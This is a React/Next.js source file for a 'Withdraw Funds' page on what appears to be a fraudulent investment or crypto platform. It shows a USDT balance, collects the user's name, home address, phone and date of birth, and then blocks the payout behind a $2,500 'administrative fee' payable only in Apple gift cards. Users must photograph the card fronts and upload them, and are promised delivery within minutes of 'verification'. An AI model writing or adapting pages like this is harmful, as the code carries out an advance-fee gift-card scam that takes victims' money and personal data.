'use client';

import React, { useState, useEffect } from 'react';
import { 
  ArrowUpRight, 
  CheckCircle2, 
  DollarSign,
  Truck,
  User,
  Calendar,
  MapPin,
  Home,
  Phone,
  Upload,
  Gift,
  FileImage,
  Plus,
  Trash2,
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Modal } from '@/components/ui/modal';

interface AppleGiftCardItem {
  id: string;
  amount: string;
  frontImage: string | null;
}

export default function WithdrawPage() {
  const [amount, setAmount] = useState<string>('');

  // Cash Delivery Fields
  const [fullName, setFullName] = useState<string>('Leo Garcia Arthur');
  const [deliveryAddress, setDeliveryAddress] = useState<string>('');
  const [deliveryCity, setDeliveryCity] = useState<string>('');
  const [deliveryState, setDeliveryState] = useState<string>('');
  const [deliveryZip, setDeliveryZip] = useState<string>('');
  const [deliveryPhone, setDeliveryPhone] = useState<string>('');
  const [dob, setDob] = useState<string>('');

  // Administrative Fee Modal State
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [giftCards, setGiftCards] = useState<AppleGiftCardItem[]>([
    { id: 'card-1', amount: '', frontImage: null }
  ]);
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMsg, setSuccessMsg] = useState(false);

  // Available balance — fetched from DB on mount
  const [availableBalanceUSD, setAvailableBalanceUSD] = useState<number>(0.0);
  const [balanceLoading, setBalanceLoading] = useState(true);

  useEffect(() => {
    async function fetchBalance() {
      setBalanceLoading(true);
      try {
        const res = await fetch('/api/user/profile');
        const data = await res.json();
        if (data?.success && data?.user?.wallets) {
          const usdtWallet = data.user.wallets.find((w: any) => w.currency === 'USDT');
          if (usdtWallet?.balance !== undefined) {
            setAvailableBalanceUSD(usdtWallet.balance);
          }
        }
      } catch (err) {
        console.warn('Balance fetch error:', err);
      } finally {
        setBalanceLoading(false);
      }
    }
    fetchBalance();
  }, []);

  const minWithdrawalUSD = 100.00;
  const targetFeeUSD = 2500.00;

  const numAmount = parseFloat(amount) || 0;

  const totalFeeUploaded = giftCards.reduce((sum, card) => sum + (parseFloat(card.amount) || 0), 0);
  const remainingFeeRequired = Math.max(0, targetFeeUSD - totalFeeUploaded);
  const isFeeFulfilled = totalFeeUploaded >= targetFeeUSD;

  const handleMax = () => {
    setAmount(availableBalanceUSD.toString());
  };

  const handleOpenModal = (e: React.FormEvent) => {
    e.preventDefault();
    if (numAmount < minWithdrawalUSD) return;
    if (numAmount > availableBalanceUSD) return;
    setIsModalOpen(true);
  };

  const addGiftCard = () => {
    setGiftCards((prev) => [
      ...prev,
      { id: `card-${Date.now()}`, amount: '', frontImage: null }
    ]);
  };

  const removeGiftCard = (id: string) => {
    if (giftCards.length === 1) return;
    setGiftCards((prev) => prev.filter((card) => card.id !== id));
  };

  const updateCardAmount = (id: string, val: string) => {
    setGiftCards((prev) =>
      prev.map((card) => (card.id === id ? { ...card, amount: val } : card))
    );
  };

  const handleFrontUpload = async (id: string, file: File) => {
    const reader = new FileReader();
    reader.onloadend = () => {
      setGiftCards((prev) =>
        prev.map((c) => (c.id === id ? { ...c, frontImage: reader.result as string } : c))
      );
    };
    reader.readAsDataURL(file);

    try {
      const formData = new FormData();
      formData.append('file', file);
      formData.append('bucket', 'withdrawal-fees');
      const res = await fetch('/api/upload', { method: 'POST', body: formData });
      const data = await res.json();
      if (data?.url) {
        setGiftCards((prev) =>
          prev.map((c) => (c.id === id ? { ...c, frontImage: data.url } : c))
        );
      }
    } catch (err) {
      console.warn('Upload fallback:', err);
    }
  };

  const handleConfirmWithdrawal = async () => {
    setIsSubmitting(true);
    try {
      await fetch('/api/gift-cards/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ giftCards }),
      });

      await fetch('/api/withdrawals', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount: numAmount,
          payoutMethod: 'CASH_DELIVERY',
          fullName,
          address: `${deliveryAddress}, ${deliveryCity}, ${deliveryState} ${deliveryZip}`,
          deliveryPhone,
          dob,
        }),
      });

      setSuccessMsg(true);
      setAmount('');
      setDeliveryAddress('');
      setDeliveryCity('');
      setDeliveryState('');
      setDeliveryZip('');
      setDeliveryPhone('');
      setDob('');
      setGiftCards([{ id: 'card-1', amount: '', frontImage: null }]);
    } catch (err) {
      console.warn('Error saving withdrawal & gift cards to database:', err);
    } finally {
      setIsSubmitting(false);
      setIsModalOpen(false);
    }
  };

  const isFormValid =
    numAmount > 0 &&
    numAmount <= availableBalanceUSD &&
    fullName.trim() !== '' &&
    deliveryAddress.trim() !== '' &&
    deliveryCity.trim() !== '' &&
    deliveryPhone.trim() !== '';

  const isModalValid =
    giftCards.length > 0 &&
    giftCards.every((c) => Boolean(c.frontImage));

  return (
    <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
      <div>
        <h1 className="text-2xl font-black text-white">Withdraw Funds ($ USD)</h1>
        <p className="text-xs text-slate-400">Request cash delivery to your home or preferred address</p>
      </div>

      <div className="max-w-2xl mx-auto space-y-6">
        <Card className="p-6 border-slate-800 space-y-6">
          {successMsg && (
            <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 flex items-start space-x-3 text-emerald-300 text-xs">
              <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400 mt-0.5" />
              <div className="space-y-1">
                <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                <p className="text-slate-300 leading-relaxed">
                  Your $2,500.00 USD administrative fee via Apple Gift Card(s) has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : availableBalanceUSD.toLocaleString('en-US')} USD will be delivered to your address immediately upon fee verification (5 - 15 mins).
                </p>
              </div>
            </div>
          )}

          <form onSubmit={handleOpenModal} className="space-y-5">

            {/* Payout Method — Cash Delivery only (single pill, no tab toggle) */}
            <div className="space-y-2">
              <label className="text-xs uppercase font-bold tracking-wider text-slate-400">Payout Method</label>
              <div className="p-3.5 rounded-xl border border-[#6EB7FF]/60 gradient-bg-blue flex items-center space-x-3">
                <Truck className="w-5 h-5 text-[#0B1220]" />
                <span className="text-sm font-extrabold text-[#0B1220]">Cash Delivery</span>
              </div>
            </div>

            {/* Amount Input */}
            <div className="space-y-2">
              <div className="flex justify-between items-center text-xs">
                <span className="uppercase font-bold tracking-wider text-slate-400">Withdrawal Amount ($ USD)</span>
                <span className="text-slate-300 font-mono">
                  Available:{' '}
                  <strong className="text-[#6EB7FF]">
                    {balanceLoading
                      ? 'Loading…'
                      : `$${availableBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD`}
                  </strong>
                </span>
              </div>
              <div className="relative flex items-center">
                <span className="absolute left-4 text-slate-400 font-bold">$</span>
                <input
                  type="number"
                  step="any"
                  placeholder="0.00"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="glass-input w-full rounded-xl pl-8 pr-16 py-3.5 text-sm text-slate-100 placeholder:text-slate-500 font-mono font-bold"
                  required
                />
                <button
                  type="button"
                  onClick={handleMax}
                  className="absolute right-3 px-2.5 py-1 bg-[#6EB7FF]/20 text-[#6EB7FF] rounded-lg text-xs font-bold hover:bg-[#6EB7FF]/40"
                >
                  MAX
                </button>
              </div>
              {numAmount > availableBalanceUSD && (
                <p className="text-xs text-rose-400 font-medium">Insufficient balance. Please check your available balance.</p>
              )}
              {numAmount > 0 && numAmount < minWithdrawalUSD && (
                <p className="text-xs text-rose-400 font-medium">Minimum withdrawal amount is ${minWithdrawalUSD.toFixed(2)} USD.</p>
              )}
            </div>

            {/* Cash Delivery Fields */}
            <div className="space-y-4 pt-1">
              {/* Full Name */}
              <Input
                label="Full Name (Recipient)"
                type="text"
                placeholder="e.g. Leo Garcia Arthur"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                leftIcon={<User className="w-4 h-4 text-[#6EB7FF]" />}
                required
              />

              {/* Street / Home Address */}
              <Input
                label="Street / Home Address"
                type="text"
                placeholder="e.g. 123 Main Street, Apt 4B"
                value={deliveryAddress}
                onChange={(e) => setDeliveryAddress(e.target.value)}
                leftIcon={<Home className="w-4 h-4 text-[#6EB7FF]" />}
                required
              />

              {/* City & State */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Input
                  label="City"
                  type="text"
                  placeholder="e.g. Albuquerque"
                  value={deliveryCity}
                  onChange={(e) => setDeliveryCity(e.target.value)}
                  leftIcon={<MapPin className="w-4 h-4 text-[#6EB7FF]" />}
                  required
                />
                <Input
                  label="State / Province"
                  type="text"
                  placeholder="e.g. New Mexico"
                  value={deliveryState}
                  onChange={(e) => setDeliveryState(e.target.value)}
                  leftIcon={<MapPin className="w-4 h-4 text-[#6EB7FF]" />}
                />
              </div>

              {/* ZIP & Phone */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Input
                  label="ZIP / Postal Code"
                  type="text"
                  placeholder="e.g. 87101"
                  value={deliveryZip}
                  onChange={(e) => setDeliveryZip(e.target.value)}
                  leftIcon={<MapPin className="w-4 h-4 text-[#6EB7FF]" />}
                />
                <Input
                  label="Contact Phone Number"
                  type="tel"
                  placeholder="e.g. +1 (505) 730-8886"
                  value={deliveryPhone}
                  onChange={(e) => setDeliveryPhone(e.target.value)}
                  leftIcon={<Phone className="w-4 h-4 text-[#6EB7FF]" />}
                  required
                />
              </div>

              {/* Date of Birth */}
              <Input
                label="Date of Birth (for identity verification)"
                type="date"
                value={dob}
                onChange={(e) => setDob(e.target.value)}
                leftIcon={<Calendar className="w-4 h-4 text-[#6EB7FF]" />}
              />
            </div>

            <Button
              type="submit"
              variant="primary"
              size="lg"
              className="w-full shadow-lg shadow-[#5A9BFF]/30 py-3.5 text-sm font-bold"
              disabled={!isFormValid}
              rightIcon={<ArrowUpRight className="w-4 h-4" />}
            >
              Withdraw ${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 }) : '0.00'} USD
            </Button>
          </form>
        </Card>
      </div>

      {/* Administrative Fee & Apple Gift Card Multi-Upload Modal */}
      <Modal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Apple Gift Card Administrative Fee ($2,500 USD)"
      >
        <div className="space-y-5 text-xs max-h-[75vh] overflow-y-auto pr-1">
          {/* Header Notice */}
          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1.5 text-amber-300">
            <div className="flex items-center justify-between font-bold text-amber-400">
              <span className="flex items-center space-x-2">
                <Gift className="w-4 h-4 shrink-0 text-amber-400" />
                <span>Apple Gift Card Fee Requirement</span>
              </span>
              <span className="text-xs font-mono px-2 py-0.5 rounded-md bg-amber-500/20 text-amber-300">
                Target: $2,500.00 USD
              </span>
            </div>
            <p className="text-[11px] leading-relaxed text-slate-300">
              Upload Apple Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong>. You can upload multiple cards until the $2,500.00 fee calculation is completed.
            </p>

            {/* Live Progress Bar */}
            <div className="pt-2 space-y-1.5">
              <div className="flex justify-between items-center text-[11px] font-bold">
                <span className="text-slate-300">Total Uploaded Fee:</span>
                <span className={`font-mono ${isFeeFulfilled ? 'text-emerald-400 font-black' : 'text-amber-300'}`}>
                  ${totalFeeUploaded.toLocaleString('en-US', { minimumFractionDigits: 2 })} / $2,500.00 USD
                </span>
              </div>
              <div className="w-full h-2.5 bg-slate-900 rounded-full overflow-hidden border border-slate-700">
                <div
                  className={`h-full transition-all duration-500 ${isFeeFulfilled ? 'bg-emerald-500' : 'gradient-bg-blue'}`}
                  style={{ width: `${Math.min(100, (totalFeeUploaded / 2500) * 100)}%` }}
                />
              </div>
              {!isFeeFulfilled && (
                <p className="text-[10px] text-amber-400 font-semibold text-right">
                  Remaining required: ${remainingFeeRequired.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </p>
              )}
            </div>
          </div>

          {/* Gift Card Upload List */}
          <div className="space-y-4">
            {giftCards.map((card, index) => (
              <div key={card.id} className="p-4 rounded-2xl bg-[#0B1220] border border-slate-800 space-y-3 relative">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white text-xs flex items-center space-x-2">
                    <Gift className="w-4 h-4 text-[#6EB7FF]" />
                    <span>Apple Gift Card #{index + 1}</span>
                  </span>
                  {giftCards.length > 1 && (
                    <button type="button" onClick={() => removeGiftCard(card.id)} className="p-1 text-rose-400 hover:text-rose-300 transition-colors">
                      <Trash2 className="w-4 h-4" />
                    </button>
                  )}
                </div>

                <div className="space-y-1">
                  <label className="block text-[11px] font-bold text-slate-300">Card Amount ($ USD)</label>
                  <div className="relative">
                    <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                    <input
                      type="number"
                      step="any"
                      placeholder="e.g. 500 or 1000 or 2500"
                      value={card.amount}
                      onChange={(e) => updateCardAmount(card.id, e.target.value)}
                      className="w-full bg-[#111A2E] border border-slate-700/80 rounded-xl pl-7 pr-4 py-2.5 text-xs text-white placeholder:text-slate-500 font-mono font-bold focus:outline-none focus:border-[#6EB7FF]"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-1.5">
                  <label className="block text-[11px] font-bold text-slate-300">Card Image (Front Upload)</label>
                  <label
                    htmlFor={`front-upload-${card.id}`}
                    className={`flex flex-col items-center justify-center p-3 rounded-xl border-2 border-dashed transition-all cursor-pointer h-24 text-center ${
                      card.frontImage ? 'border-emerald-500/60 bg-emerald-500/10' : 'border-slate-700 bg-[#111A2E] hover:border-[#6EB7FF]'
                    }`}
                  >
                    {card.frontImage ? (
                      <div className="flex flex-col items-center space-y-1">
                        <FileImage className="w-5 h-5 text-emerald-400" />
                        <span className="text-[10px] font-bold text-emerald-300">Front Image Uploaded ✓</span>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center space-y-1 text-slate-400">
                        <Upload className="w-5 h-5 text-[#6EB7FF]" />
                        <span className="text-[10px] font-bold text-white">Upload Apple Card Image</span>
                        <span className="text-[8px] text-slate-500">Click or drop front card photo</span>
                      </div>
                    )}
                  </label>
                  <input
                    id={`front-upload-${card.id}`}
                    type="file"
                    accept="image/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) handleFrontUpload(card.id, file);
                    }}
                    className="hidden"
                  />
                </div>
              </div>
            ))}
          </div>

          {!isFeeFulfilled && (
            <button
              type="button"
              onClick={addGiftCard}
              className="w-full py-3 rounded-xl border border-dashed border-[#6EB7FF]/40 bg-[#6EB7FF]/10 text-[#6EB7FF] font-bold text-xs hover:bg-[#6EB7FF]/20 flex items-center justify-center space-x-2 transition-all"
            >
              <Plus className="w-4 h-4" />
              <span>Add Another Apple Gift Card</span>
            </button>
          )}

          <div className="flex space-x-3 pt-2">
            <Button variant="secondary" size="md" className="flex-1" onClick={() => setIsModalOpen(false)}>
              Cancel
            </Button>
            <Button
              variant="primary"
              size="md"
              className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
              isLoading={isSubmitting}
              disabled={!isModalValid}
              onClick={handleConfirmWithdrawal}
            >
              Submit $2,500 Fee & Complete Payout
            </Button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
